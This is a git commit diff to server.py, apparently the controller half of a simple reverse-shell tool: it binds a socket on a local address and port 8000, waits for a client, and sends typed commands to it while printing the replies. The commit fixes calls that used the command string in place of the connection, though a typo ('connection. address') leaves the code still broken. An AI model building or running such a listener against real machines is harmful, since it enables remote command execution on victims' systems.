7887ddb46a0f400e130036447fe8dbc8ae301d7c
ekkopy <thiagognlcn@gmail.com>
2019-10-01 20:35:55 -0300

    fixing error type

--- server.py
+++ server.py
@@ -4,7 +4,7 @@ import socket
 
 def open_connect_to_client():
     skc = socket.socket()
-    skc.bind(("192.168.1.3", 8000))
+    skc.bind(("192.168.1.4", 8000))
     skc.listen(1)
     connection. address = skc.accept()
     print(f"[*] new connection from {address}")
@@ -13,12 +13,12 @@ def open_connect_to_client():
         cmd = input("user:~>")
         if "terminate" in cmd:
             print("[*] close conection :(")
-            cmd.send('terminate'.encode())
-            cmd.close()
+            connection.send('terminate'.encode())
+            connection.close()
             break
         else:
-            cmd.send(cmd.encode())
-            print(cmd.recv(1024).decode())
+            connection.send(cmd.encode())
+            print(connection.recv(1024).decode())
 
 if __name__ == "__main__":
     open_connect_to_client()
